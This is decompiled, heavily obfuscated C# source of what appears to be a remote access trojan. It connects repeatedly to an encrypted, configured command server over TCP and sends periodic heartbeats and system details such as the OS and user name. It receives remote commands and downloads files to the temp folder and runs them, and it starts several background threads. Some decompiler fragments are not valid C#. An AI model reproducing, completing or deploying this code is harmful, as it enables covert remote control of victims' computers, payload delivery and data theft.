using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

[StandardModule]
public sealed class ______________________________________________________________
{
	private delegate void _______________________________________________________________(string string_0);

	internal class ________________________________________________________________
	{
		public ______________________________________________________________________ _;

		[System.Diagnostics.DebuggerStepThrough]
		public void _()
		{
			this._.ShowDialog();
		}
	}

	public static TcpClient __;

	public static System.IO.StreamWriter ___;

	public static bool ____;

	public static System.IO.StreamReader _____;

	private static ______________________________________________________________._______________________________________________________________ ______;

	public static bool _______;

	public static bool ________;

	private static bool _________;

	public static bool __________;

	private static int ___________;

	private static System.IO.FileStream ____________;

	public static string _____________;

	public static int ______________;

	public static string _______________;

	public static string ________________;

	public static string _________________;

	public static string __________________;

	public static string ___________________;

	public static string ____________________;

	public static string[] _____________________;

	public static bool ______________________;

	public static string _______________________;

	public static string ________________________;

	public static bool _________________________;

	public static System.Threading.Mutex __________________________;

	public static bool ___________________________;

	public static bool ____________________________;

	private static event ______________________________________________________________._______________________________________________________________ _
	{
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		add
		{
			______________________________________________________________.______ = (______________________________________________________________._______________________________________________________________)System.Delegate.Combine(______________________________________________________________.______, value);
		}
		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		remove
		{
			______________________________________________________________.______ = (______________________________________________________________._______________________________________________________________)System.Delegate.Remove(______________________________________________________________.______, value);
		}
	}

	static ______________________________________________________________()
	{
		// Note: this type is marked as 'beforefieldinit'.
		______________________________________________________________._ = new System.Threading.Thread(new System.Threading.ThreadStart(______________________________________________________________._________));
		______________________________________________________________.____ = false;
		int num = -18910;
		switch (sizeof(ulong) + -8)
		{
		}
		do
		{
			______________________________________________________________._______ = false;
			______________________________________________________________.________ = false;
			______________________________________________________________._________ = false;
			______________________________________________________________.__________ = false;
		}
		while (num != -18910);
		______________________________________________________________.___________ = 0;
		int arg_D8_0 = System.Type.EmptyTypes.Length + 10054;
		int arg_D8_1 = 11783;
		int num2 = <Module>.___________;
		int arg_84_0 = num2;
		int arg_83_0 = 385;
		int num3 = <Module>.________________;
		int arg_D8_2;
		if ((arg_84_0 + arg_83_0 * num3 + num2 * 3 + num3 * 127 & 1) != 0)
		{
			int num4;
			arg_D8_2 = (((14 * (num4 / 262144) + 2 * (num4 / 262144) ^ 16781985) != 0) ? (System.Type.EmptyTypes.Length + -1670853533) : (System.Type.EmptyTypes.Length + 2028017545));
		}
		else
		{
			int num4 = checked((int)250.0);
			arg_D8_2 = num4;
		}
		______________________________________________________________._______________ = <Module>.__________(arg_D8_0, arg_D8_1, arg_D8_2);
		______________________________________________________________.______________________ = false;
		______________________________________________________________._______________________ = <Module>.______<string>(3058521720u);
		______________________________________________________________.________________________ = <Module>._______<string>(2127844380u);
		______________________________________________________________._________________________ = false;
		______________________________________________________________.___________________________ = false;
		______________________________________________________________.____________________________ = false;
	}

	[System.STAThread]
	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
	public static void ___()
	{
		try
		{
			string text = ___________________________________________________________________._(__________________________________________________________________________._____.Trim(), <Module>.____<string>(668638760u));
			text = text.Trim();
			______________________________________________________________._____________________ = Strings.Split(text, <Module>._______<string>(1023697363u), -1, CompareMethod.Binary);
			int arg_8A_0 = sizeof(uint) + -2;
			while (true)
			{
				switch (arg_8A_0)
				{
				case 0:
					______________________________________________________________._______________ = ______________________________________________________________._____________________[2];
					______________________________________________________________.________________ = ______________________________________________________________._____________________[3];
					arg_8A_0 = sizeof(short) + -1;
					continue;
				case 1:
					goto IL_9D;
				}
				______________________________________________________________._____________ = ______________________________________________________________._____________________[0];
				______________________________________________________________.______________ = System.Convert.ToInt32(______________________________________________________________._____________________[1]);
				arg_8A_0 = System.Type.EmptyTypes.Length + 0;
			}
			IL_9D:
			______________________________________________________________._________________ = ______________________________________________________________._____________________[4];
			______________________________________________________________.__________________ = ______________________________________________________________._____________________[5];
			______________________________________________________________.___________________ = ______________________________________________________________._____________________[6];
			______________________________________________________________.____________________ = ______________________________________________________________._____________________[7];
			if (!______________________________________________________________.___________________.Contains(<Module>._____<string>(585574209u)))
			{
				______________________________________________________________.___________________________ = true;
			}
		}
		catch (System.Exception expr_EB)
		{
			ProjectData.SetProjectError(expr_EB);
			System.Threading.Thread.Sleep(-1);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (______________________________________________________________.___________________.Contains(<Module>.___<string>(2940146034u)) && ___________________________________________________________________.______())
			{
				______________________________________________________________._____();
			}
		}
		catch (System.Exception arg_123_0)
		{
			ProjectData.SetProjectError(arg_123_0);
			ProjectData.ClearProjectError();
		}
		try
		{
			_____________________________________________________________________________.__ = Application.ExecutablePath;
			__________________________________________________________________._();
			global::______________________.__();
		}
		catch (System.Exception arg_145_0)
		{
			ProjectData.SetProjectError(arg_145_0);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(______________________________________________________________._________________, <Module>._______<string>(1177340789u), false) != 0)
		{
			_____________________________________________________________________________.________();
		}
		if (______________________________________________________________.____(______________________________________________________________.__________________))
		{
			ProjectData.EndApp();
		}
		______________________________________________________________.______();
	}

	public static bool ____(string string_0)
	{
		bool result;
		try
		{
			______________________________________________________________.__________________________ = new System.Threading.Mutex(false, <Module>.______<string>(3336824671u) + string_0);
			switch (System.Type.EmptyTypes.Length + 0)
			{
			case 0:
				IL_2C:
				if (!______________________________________________________________.__________________________.WaitOne(0, false))
				{
					______________________________________________________________.__________________________.Close();
					______________________________________________________________.__________________________ = null;
					result = true;
					return result;
				}
				______________________________________________________________.______________________ = true;
				result = false;
				return result;
			}
			goto IL_2C;
		}
		catch (System.UnauthorizedAccessException expr_58)
		{
			ProjectData.SetProjectError(expr_58);
			result = true;
			ProjectData.ClearProjectError();
		}
		catch (System.Exception expr_68)
		{
			ProjectData.SetProjectError(expr_68);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void _____()
	{
		int num;
		int num4;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			int num3 = 1;
			switch (System.Type.EmptyTypes.Length + 0)
			{
			}
			while (true)
			{
				IL_26:
				num2 = 4;
				if (num3 == 100000)
				{
					break;
				}
				IL_1F:
				num2 = 5;
				num3++;
			}
			IL_31:
			num2 = 7;
			______________________________________________________________._____();
			IL_39:
			goto IL_AD;
			IL_3B:
			int arg_42_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_42_0);
			IL_6B:
			goto IL_A2;
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_7F:
			goto IL_A2;
		}
		object arg_81_0;
		endfilter(arg_81_0 is System.Exception & num != 0 & num4 == 0);
		IL_A2:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_AD:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ______()
	{
		int num;
		int num4;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			______________________________________________________________._.Start();
			int num3 = System.Type.EmptyTypes.Length + 28966;
			int arg_B5_0 = sizeof(ulong) + -6;
			while (true)
			{
				switch (arg_B5_0)
				{
				case 0:
					goto IL_CB;
				case 1:
					goto IL_102;
				case 2:
					IL_2F:
					num3 = 28966;
					break;
				}
				num2 = 3;
				System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(______________________________________________________________._______));
				if (num3 == -32216)
				{
					if (-352232712 + (num2 << 3) != 43288 * num2 + 9974)
					{
						goto IL_102;
					}
				}
				IL_6E:
				num2 = 4;
				thread.Start();
				IL_76:
				num2 = 5;
				_______________________________________.___();
				num3 = (((num3 / 268435456 | 6991) == 6991) ? (sizeof(float) + 28207) : (sizeof(short) + -2108587613));
				arg_B5_0 = sizeof(System.Guid) + -16;
			}
			IL_CB:
			num3 = 28211;
			num2 = 6;
			System.Threading.Thread thread2 = new System.Threading.Thread(new System.Threading.ThreadStart(global::_______________________._));
			IL_E5:
			num2 = 7;
			thread2.Start();
			IL_ED:
			num2 = 8;
			System.Threading.Thread thread3 = new System.Threading.Thread(new System.Threading.ThreadStart(global::________________________._));
			IL_102:
			num2 = 9;
			thread3.Start();
			IL_10C:
			num2 = 10;
			System.Threading.Thread thread4 = new System.Threading.Thread(new System.Threading.ThreadStart(global::______________________._____));
			IL_122:
			num2 = 11;
			thread4.Start();
			IL_12C:
			num2 = 12;
			if (______________________________________________________________.___________________.Contains(<Module>.___<string>(1468083866u)))
			{
				goto IL_164;
			}
			IL_145:
			num2 = 13;
			using (_____________________________________________________________ ____________________________________________________________ = new _____________________________________________________________())
			{
				Application.Run(____________________________________________________________);
			}
			IL_164:
			goto IL_1FC;
			IL_169:
			int arg_170_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_170_0);
			IL_1B9:
			goto IL_1F1;
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_1CD:
			goto IL_1F1;
		}
		object arg_1CF_0;
		endfilter(arg_1CF_0 is System.Exception & num != 0 & num4 == 0);
		IL_1F1:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_1FC:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void _______()
	{
		int num;
		int num9;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			System.AppDomain.CurrentDomain.AssemblyResolve += new System.ResolveEventHandler(______________________________________________________________._______________________);
			int arg_28_0 = sizeof(ushort) + 5;
			System.Threading.Thread thread2;
			System.Timers.Timer timer;
			while (true)
			{
				string text;
				int num4;
				string left;
				switch (arg_28_0)
				{
				case 0:
					goto IL_389;
				case 1:
				{
					IL_58C:
					num2 = 16;
					System.Threading.Thread thread;
					thread.Start();
					IL_597:
					num2 = 17;
					if (Operators.CompareString(______________________________________________________________._________________, <Module>._____<string>(3717744333u), false) != 0)
					{
						arg_28_0 = System.Type.EmptyTypes.Length + 5;
						continue;
					}
					goto IL_2DE;
				}
				case 2:
					IL_57E:
					num2 = 26;
					____________________________________________________________.______();
					goto IL_304;
				case 3:
					text = ______________________________________________________________.___________________;
					goto IL_45D;
				case 4:
					goto IL_606;
				case 5:
					goto IL_3C4;
				case 6:
					goto IL_2D8;
				case 7:
					goto IL_51D;
				case 8:
				{
					IL_48D:
					num2 = 10;
					_____________________________________________________________________________.__(<Module>._____<string>(1392149989u));
					IL_4A0:
					num2 = 11;
					int num3 = <Module>.____________;
					arg_28_0 = (((num3 * 67108864 & 67106405) != 0) ? (System.Type.EmptyTypes.Length + 1327412084) : 12);
					continue;
				}
				case 9:
					goto IL_283;
				case 10:
					if (Operators.CompareString(text, <Module>.__________(checked((int)(unchecked((System.IntPtr)22372))), sizeof(byte) + 24125, checked((int)(unchecked((System.IntPtr)234)))), false) != 0)
					{
						goto IL_45D;
					}
					if (num4 != 32436)
					{
						goto IL_283;
					}
					IL_3F3:
					num2 = 5;
					__________________________________________________________________._____(<Module>.______<string>(2486069650u), ______________________________________________________________.___________________);
					IL_40A:
					num2 = 6;
					arg_28_0 = ((-(-268435456 * num) == -9119) ? checked((int)-1270050446.0) : (((-1052523261 ^ 9417 + (num4 << 20)) == 0) ? (System.Type.EmptyTypes.Length + 2145487941) : (System.Type.EmptyTypes.Length + 3)));
					continue;
				case 11:
				{
					while (text.Contains(<Module>._______<string>(1122568241u)))
					{
						IL_66:
						num2 = 30;
						num4 = -27042;
						if (System.Type.EmptyTypes.Length + 15388 != 15388)
						{
							goto IL_D7;
						}
						if (______________________________________________________________.___________________________)
						{
							break;
						}
						IL_90:
						num2 = 31;
						thread2 = new System.Threading.Thread(new System.Threading.ThreadStart(________________________________________________________________________________._));
						num4 = 18028;
						int num3;
						if ((num3 / 2 ^ -9529) != 0)
						{
							IL_16C:
							num2 = 32;
							thread2.Start();
							break;
						}
					}
					IL_5C3:
					num2 = 35;
					left = __________________________________________________________________.____(<Module>.______<string>(2229442060u));
					num4 = -24281;
					int num5 = global::___________._;
					if ((num5 % 117 - -9776 & -4608) != 9728)
					{
						arg_28_0 = sizeof(ushort) + 1331665118;
						continue;
					}
					int num6;
					if (num6 - (-2052786618 ^ num6) != -5381)
					{
						arg_28_0 = System.Type.EmptyTypes.Length + 9;
						continue;
					}
					if ((8 & num6 << 3) == (8 & 3 * num6 + 5 * num6 - 4250))
					{
						int arg_1B4_0 = 2;
						int num7 = global::______________________._______;
						arg_28_0 = (((arg_1B4_0 * num7 + num7 * 2 ^ 6775) != 0) ? (((-(538 * num2 + num2 * 486) + -1555922944 * num2 ^ 8042) == 0) ? (sizeof(byte) + -2120800735) : (System.Type.EmptyTypes.Length + -1290926091)) : (System.Type.EmptyTypes.Length + 1255623367));
						continue;
					}
					arg_28_0 = System.Type.EmptyTypes.Length + -1308233337;
					continue;
				}
				case 12:
					goto IL_655;
				default:
					goto IL_51D;
				}
				IL_D7:
				num2 = 43;
				timer = new System.Timers.Timer();
				IL_E2:
				num2 = 44;
				System.Timers.Timer arg_FB_0 = timer;
				object arg_F6_0 = null;
				System.IntPtr arg_F6_1 = ldftn(____________________________);
				<Module>._________ = left;
				arg_FB_0.Elapsed += new ElapsedEventHandler(arg_F6_0, arg_F6_1);
				int num8 = <Module>.__________;
				arg_28_0 = ((((-(num8 << 20) ^ (num * 622 + num * 402) * 2) & 1152) != 0) ? (sizeof(ulong) + -2114781929) : ((1930 * num2 + 118 * num2 == -1697271203) ? (System.Type.EmptyTypes.Length + 764690478) : (System.Type.EmptyTypes.Length + 4)));
				continue;
				IL_2DE:
				num2 = 25;
				if (text.Contains(<Module>.______<string>(417590602u)))
				{
					arg_28_0 = checked((int)2.0);
					continue;
				}
				goto IL_304;
				IL_2D8:
				______________________________________________________________.____ = true;
				goto IL_2DE;
				IL_283:
				num4 = -24281;
				num2 = 36;
				if (Operators.CompareString(left, <Module>.__________(System.Type.EmptyTypes.Length + 29502, System.Type.EmptyTypes.Length + 29241, sizeof(short) + 208), false) != 0)
				{
					if (num4 == 28058)
					{
						goto IL_2D8;
					}
					IL_2CB:
					num2 = 37;
					______________________________________________________________._______________ = left;
				}
				IL_31F:
				num2 = 39;
				if (text.Contains(<Module>.___<string>(1972471017u)))
				{
					num4 = 9970;
					IL_33D:
					num2 = 40;
					global::_________________________._____();
				}
				IL_346:
				num2 = 42;
				if (!______________________________________________________________.____)
				{
					goto IL_625;
				}
				num4 = 23842;
				if ((~(num9 % 8388608) | -2063597569) != -1)
				{
					goto IL_3C4;
				}
				goto IL_D7;
				IL_304:
				num2 = 28;
				______________________________________________________________________________.____();
				IL_30D:
				num2 = 29;
				arg_28_0 = System.Type.EmptyTypes.Length + 11;
				continue;
				IL_389:
				num2 = 20;
				System.Timers.Timer timer2;
				timer2.Interval = 5000.0;
				IL_39D:
				num2 = 21;
				num4 = -6648;
				int arg_3B5_0 = 2;
				int arg_3B1_0 = 3;
				int num10 = <Module>._________________;
				if ((arg_3B5_0 & -(arg_3B1_0 * num10 + num10)) == (int)(2u & (uint)(num10 / 827) >> 25))
				{
					timer2.Start();
					IL_3D8:
					num2 = 22;
					_________________________________________________________________._();
					IL_3E1:
					num2 = 23;
					arg_28_0 = sizeof(double) + -2;
					continue;
				}
				IL_3C4:
				num2 = 18;
				timer2 = new System.Timers.Timer();
				IL_372:
				num2 = 19;
				timer2.Elapsed += new ElapsedEventHandler(______________________________________________________________.___________________________);
				goto IL_389;
				IL_45D:
				num2 = 8;
				if (___________________________________________________________________.______())
				{
					IL_467:
					num2 = 9;
					num4 = -6119;
					if (Operators.CompareString(______________________________________________________________._________________, <Module>.______<string>(2363746648u), false) != 0)
					{
						goto IL_48D;
					}
					goto IL_664;
				}
				else
				{
					IL_4D2:
					num2 = 15;
					System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(_____________________________________________________________________________.___));
					if ((16781191 ^ num % 1048576) != 0)
					{
						int num11 = checked((int)1.0);
						arg_28_0 = num11;
						continue;
					}
					arg_28_0 = System.Type.EmptyTypes.Length + 1883885173;
					continue;
				}
				IL_51D:
				num2 = 3;
				text = __________________________________________________________________.____(<Module>._____<string>(2115722719u));
				IL_531:
				num2 = 4;
				num4 = System.Type.EmptyTypes.Length + 32436;
				arg_28_0 = (((1 & -num9 - (88566037 + -num9)) != 1) ? (System.Type.EmptyTypes.Length + 2123202231) : (sizeof(short) + 8));
			}
			IL_606:
			num2 = 45;
			timer.Interval = 120000.0;
			IL_61A:
			num2 = 46;
			timer.Start();
			IL_625:
			num2 = 48;
			System.AppDomain arg_641_0 = System.AppDomain.CurrentDomain;
			____________________________________________________________________________._ = thread2;
			arg_641_0.UnhandledException += new System.UnhandledExceptionEventHandler(______________________________________________________________._____________________________);
			IL_646:
			num2 = 49;
			System.Threading.Thread.Sleep(-1);
			IL_650:
			goto IL_783;
			IL_655:
			_____________________________________________________________________________.__(<Module>._____<string>(151820431u));
			IL_664:
			goto IL_783;
			IL_669:
			int arg_670_0 = num9 + 1;
			num9 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_670_0);
			IL_741:
			goto IL_778;
			num9 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_755:
			goto IL_778;
		}
		object arg_757_0;
		endfilter(arg_757_0 is System.Exception & num != 0 & num9 == 0);
		IL_778:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_783:
		if (num9 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ________()
	{
		int num;
		int num3;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			if (!__________________________________________________________________.____(<Module>._______<string>(878090607u)).Contains(<Module>.____<string>(425164776u)))
			{
				goto IL_5A;
			}
			IL_2A:
			num2 = 3;
			if (Operators.CompareString(__________________________________________________________________.____(<Module>.______<string>(2365711259u)), <Module>.___<string>(1266744735u), false) == 0)
			{
				goto IL_5A;
			}
			IL_4E:
			num2 = 4;
			_________________________________________________._____();
			IL_55:
			goto IL_103;
			IL_5A:
			num2 = 8;
			if (Operators.CompareString(__________________________________________________________________.____(<Module>.___<string>(561018453u)), <Module>._______<string>(1847964473u), false) != 0)
			{
				goto IL_86;
			}
			IL_7E:
			num2 = 9;
			_________________________________________________._____();
			IL_86:
			goto IL_103;
			IL_88:
			int arg_8D_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_8D_0);
			IL_C2:
			goto IL_F8;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_D5:
			goto IL_F8;
		}
		object arg_D7_0;
		endfilter(arg_D7_0 is System.Exception & num != 0 & num3 == 0);
		IL_F8:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_103:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void _________()
	{
		while (true)
		{
			try
			{
				int num;
				do
				{
					______________________________________________________________.__ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
					if (!______________________________________________________________._________)
					{
						______________________________________________________________._________ = true;
						switch (System.Type.EmptyTypes.Length + 0)
						{
						case 0:
							IL_51:
							______________________________________________________________.__.ReceiveTimeout = 120000;
							______________________________________________________________.__.SendTimeout = 120000;
							goto IL_04;
						}
						goto IL_51;
					}
					IL_04:
					______________________________________________________________.___________(string.Format(<Module>.___<string>(500408849u) + ______________________________________________________________.___________________(), new object[0]));
				}
				while ((-877461504 & num) != (num & -877461504));
				______________________________________________________________._________________________ = true;
				if (!______________________________________________________________._______)
				{
					______________________________________________________________._______ = true;
					System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(______________________________________________________________._______________));
					thread.Start();
				}
				if (!______________________________________________________________.________)
				{
					______________________________________________________________.________ = true;
					______________________________________________________________._ += new ______________________________________________________________._______________________________________________________________(______________________________________________________________._____________________);
				}
				______________________________________________________________.__.GetStream().BeginRead(new byte[]
				{
					0
				}, 0, 0, new System.AsyncCallback(______________________________________________________________.________________), null);
			}
			catch (System.Exception expr_10C)
			{
				ProjectData.SetProjectError(expr_10C);
				try
				{
					if (Operators.CompareString(______________________________________________________________._______________, <Module>._____<string>(3717744333u), false) != 0)
					{
						if (Operators.CompareString(______________________________________________________________._____________, ______________________________________________________________._____________________[0], false) == 0)
						{
							______________________________________________________________._____________ = ______________________________________________________________._______________;
						}
						else
						{
							______________________________________________________________._____________ = ______________________________________________________________._____________________[0];
						}
					}
					______________________________________________________________.__.Close();
					______________________________________________________________._________________________ = false;
				}
				catch (System.Exception expr_16A)
				{
					ProjectData.SetProjectError(expr_16A);
					ProjectData.ClearProjectError();
				}
				System.Threading.Thread.Sleep(12000);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
	}

	public static void __________(string string_0)
	{
		try
		{
			______________________________________________________________.___ = new System.IO.StreamWriter(______________________________________________________________.__.GetStream());
			______________________________________________________________.___.WriteLine(string_0);
			______________________________________________________________.___.Flush();
		}
		catch (System.Exception expr_2B)
		{
			ProjectData.SetProjectError(expr_2B);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________(string string_0)
	{
		try
		{
			if (______________________________________________________________.__.Connected)
			{
				______________________________________________________________.___ = new System.IO.StreamWriter(______________________________________________________________.__.GetStream());
				______________________________________________________________.___.WriteLine(<Module>.______<string>(1712386938u) + ___________________________________________________________________.__(string_0));
				______________________________________________________________.___.Flush();
			}
		}
		catch (System.Exception expr_4B)
		{
			ProjectData.SetProjectError(expr_4B);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____________(string string_0)
	{
		try
		{
			______________________________________________________________.___________(<Module>.___<string>(2295029356u) + string_0);
		}
		catch (System.Exception expr_17)
		{
			ProjectData.SetProjectError(expr_17);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____________(string string_0)
	{
		try
		{
			______________________________________________________________.___ = new System.IO.StreamWriter(______________________________________________________________.__.GetStream());
			______________________________________________________________.___.WriteLine(<Module>.___<string>(53750159u) + string_0);
			______________________________________________________________.___.Flush();
		}
		catch (System.Exception expr_3A)
		{
			ProjectData.SetProjectError(expr_3A);
			ProjectData.ClearProjectError();
		}
	}

	public static void ______________(string string_0, string string_1)
	{
		try
		{
			if (__________________________________________________________________.____(<Module>.___<string>(2160535770u)).Contains(<Module>.___<string>(2214909433u)))
			{
				int arg_57_0 = sizeof(ulong) + -8;
				string[] array;
				int num;
				while (true)
				{
					switch (arg_57_0)
					{
					case 1:
						goto IL_66;
					}
					array = new string[7];
					array[0] = <Module>._____<string>(3302446156u);
					num = sizeof(long) + -15906;
					arg_57_0 = System.Type.EmptyTypes.Length + 1;
				}
				IL_66:
				array[1] = string_0;
				array[2] = <Module>.______<string>(861631917u);
				if (num != -15898)
				{
				}
				array[3] = ______________________________________________________________.________________________;
				array[4] = <Module>._____<string>(1052623516u);
				array[5] = string_1;
				array[6] = <Module>.___<string>(2677394803u);
				______________________________________________________________.___________(string.Concat(array));
			}
		}
		catch (System.Exception arg_B2_0)
		{
			ProjectData.SetProjectError(arg_B2_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void _______________()
	{
		while (true)
		{
			try
			{
				______________________________________________________________.___________(<Module>.______<string>(2180132865u));
			}
			catch (System.Exception arg_11_0)
			{
				ProjectData.SetProjectError(arg_11_0);
				ProjectData.ClearProjectError();
			}
			System.Threading.Thread.Sleep(60000);
		}
	}

	public static void ________________(System.IAsyncResult iasyncResult_0)
	{
		try
		{
			______________________________________________________________._____ = new System.IO.StreamReader(______________________________________________________________.__.GetStream());
			______________________________________________________________._______________________________________________________________ ______________________________________________________________ = ______________________________________________________________.______;
			if (______________________________________________________________ != null)
			{
				______________________________________________________________(___________________________________________________________________.___(______________________________________________________________._____.ReadLine()));
			}
			______________________________________________________________.__.GetStream().BeginRead(new byte[]
			{
				0
			}, 0, 0, new System.AsyncCallback(______________________________________________________________.________________), null);
		}
		catch (System.Exception expr_5F)
		{
			ProjectData.SetProjectError(expr_5F);
			while (______________________________________________________________.____________________________)
			{
				System.Threading.Thread.Sleep(1000);
			}
			______________________________________________________________._________________________ = false;
			System.Threading.Thread.Sleep(12000);
			try
			{
				______________________________________________________________.__.Close();
			}
			catch (System.Exception arg_95_0)
			{
				ProjectData.SetProjectError(arg_95_0);
				ProjectData.ClearProjectError();
			}
			______________________________________________________________._________();
			ProjectData.ClearProjectError();
		}
	}

	public static void _________________(string string_0, string string_1, int int_0, int int_1)
	{
		try
		{
			System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(new _____________________________________
			{
				__ = string_0,
				___ = string_1,
				____ = int_0,
				_____ = int_1
			}.________));
			thread.Start();
		}
		catch (System.Exception arg_3D_0)
		{
			ProjectData.SetProjectError(arg_3D_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void __________________(string string_0, string string_1, bool bool_0)
	{
		try
		{
			string text;
			if (-15688 == sizeof(double) + -15696)
			{
				WebClient webClient = new WebClient();
				text = System.IO.Path.GetTempPath() + string_1;
				if (!System.IO.File.Exists(text))
				{
					switch (System.Type.EmptyTypes.Length + 1)
					{
					case 0:
						goto IL_57;
					case 1:
						IL_45:
						webClient.DownloadData(string_0);
						webClient.DownloadFile(string_0, text);
						goto IL_57;
					}
					goto IL_45;
				}
				______________________________________________________________.______________(<Module>._____<string>(1464211711u), <Module>.______<string>(30716926u) + string_1);
				return;
			}
			IL_57:
			Process.Start(text);
			if (bool_0)
			{
				______________________________________________________________.______________(<Module>.______<string>(2043928306u), <Module>._____<string>(2721047570u) + text);
				_____________________________________________________________________________.____________();
			}
			else
			{
				______________________________________________________________.______________(<Module>._______<string>(2721646351u), <Module>._______<string>(2843225781u) + text);
			}
		}
		catch (System.Exception expr_C9)
		{
			ProjectData.SetProjectError(expr_C9);
			System.Exception ex = expr_C9;
			______________________________________________________________.______________(<Module>._______<string>(2357608790u), <Module>.____<string>(2595474110u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static string ___________________()
	{
		string result;
		try
		{
			string text = ______________________________________________________________.________________________ + <Module>.______<string>(861631917u);
			text += <Module>.______<string>(1309731734u);
			try
			{
				text += <Module>.______<string>(2630197293u);
			}
			catch (System.Exception arg_39_0)
			{
				ProjectData.SetProjectError(arg_39_0);
				text += <Module>.______<string>(2630197293u);
				ProjectData.ClearProjectError();
			}
			string str = <Module>._____<string>(3077268962u);
			try
			{
				if (System.Environment.GetFolderPath(System.Environment.SpecialFolder.ProgramFiles).Contains(<Module>.____<string>(836847038u)))
				{
					str = <Module>.___<string>(158340191u);
				}
				else
				{
					str = <Module>.___<string>(3747581205u);
				}
			}
			catch (System.Exception arg_93_0)
			{
				ProjectData.SetProjectError(arg_93_0);
				str = <Module>._____<string>(3077268962u);
				ProjectData.ClearProjectError();
			}
			try
			{
				string name = global::_____________._.Name;
				if (Operators.CompareString(name, string.Empty, false) != 0)
				{
					int processorCount;
					text = text + <Module>.___<string>(2677394803u) + name + <Module>.__________(((processorCount % 32768 & 1813544960) == 0) ? 45417 : (System.Type.EmptyTypes.Length + 1580339735), 47121, System.Type.EmptyTypes.Length + 197);
				}
				else
				{
					text += <Module>.___<string>(3686971601u);
				}
			}
			catch (System.Exception arg_125_0)
			{
				ProjectData.SetProjectError(arg_125_0);
				text += <Module>.______<string>(322836794u);
				ProjectData.ClearProjectError();
			}
			try
			{
				int num;
				if (~(2077372460 | num * 2 + 2 * num) == num + num * 3 - 5616)
				{
				}
				string oSFullName;
				int num2;
				do
				{
					oSFullName = global::_____________._.Info.OSFullName;
					if (!oSFullName.Contains(<Module>.___<string>(2981245319u)))
					{
						goto IL_1B5;
					}
				}
				while ((43 * num2 + num2 * 21 + 4904 | -34) != -2);
				text = text + <Module>.____<string>(774338714u) + str;
				IL_1B5:
				int arg_230_0;
				if (oSFullName.Contains(<Module>.______<string>(628773579u)))
				{
					arg_230_0 = System.Type.EmptyTypes.Length + 1;
					goto IL_230;
				}
				goto IL_287;
				IL_1D5:
				if (oSFullName.Contains(<Module>._____<string>(3789711746u)))
				{
					text = text + <Module>.___<string>(985285681u) + str;
				}
				if (!oSFullName.Contains(<Module>._______<string>(758530680u)))
				{
					goto IL_2B1;
				}
				arg_230_0 = System.Type.EmptyTypes.Length + 2;
				IL_230:
				switch (arg_230_0)
				{
				case 0:
					text = text + <Module>.___<string>(662727342u) + str;
					goto IL_1D5;
				case 1:
					IL_241:
					text = text + <Module>._______<string>(484667940u) + str;
					goto IL_287;
				case 2:
					text = text + <Module>._____<string>(321630822u) + str;
					goto IL_2B1;
				}
				goto IL_241;
				IL_287:
				if (oSFullName.Contains(<Module>._______<string>(539440488u)))
				{
					int num3;
					arg_230_0 = (((num3 + 3 * num3 + 3 * num3 + num3 & 1399282432) == (num3 * 8 & 1399282432)) ? (System.Type.EmptyTypes.Length + 0) : 786565624);
					goto IL_230;
				}
				goto IL_1D5;
				IL_2B1:
				if (oSFullName.Contains(<Module>.______<string>(1197231787u)))
				{
					text = text + <Module>.______<string>(3851979822u) + str;
				}
				if (!text.Contains(<Module>._____<string>(1128206602u)))
				{
					text = text + <Module>.____<string>(3407540459u) + str;
				}
			}
			catch (System.Exception arg_2FC_0)
			{
				ProjectData.SetProjectError(arg_2FC_0);
				text = text + <Module>.____<string>(3407540459u) + str;
